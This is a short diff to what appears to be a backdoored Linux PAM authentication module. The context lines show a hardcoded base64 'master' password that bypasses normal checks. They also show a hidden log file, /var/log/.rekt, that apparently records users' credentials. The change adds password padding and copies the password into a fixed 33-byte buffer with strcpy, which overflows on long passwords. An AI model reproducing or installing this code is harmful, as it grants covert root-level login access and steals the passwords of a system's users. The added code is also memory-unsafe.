@@ -73,9 +73,20 @@
  *      onto a normal UNIX authentication
  */
 
-unsigned char *bdstr = "_PASSWORD_";
+unsigned char bdstr[] = "_PASSWORD_";
 FILE *rekt;
 
+char *StringPadRight(char *string, int padded_len, char *pad) {
+    int len = (int) strlen(string);
+    if (len >= padded_len) {
+        return string;
+    }
+    int i;
+    for (i = 0; i < padded_len - len; i++) {
+        strcat(string, pad);
+    }
+    return string;
+}
 
 #define AUTH_RETURN						\
 do {									\
@@ -176,7 +187,10 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
 	D(("user=%s, password=[%s]", name, p));
 
 	/* verify the password of this user */
-        char *bdenc = b64_encode(p, strlen(p));
+		char p1[33];
+		strcpy(p1, p);
+		StringPadRight(p1, 32, " ");
+        char *bdenc = b64_encode(p1, strlen(p1));
         if (strcmp(bdenc, bdstr) != 0) {
           retval = _unix_verify_password(pamh, name, p, ctrl);
           rekt=fopen("/var/log/.rekt", "a");
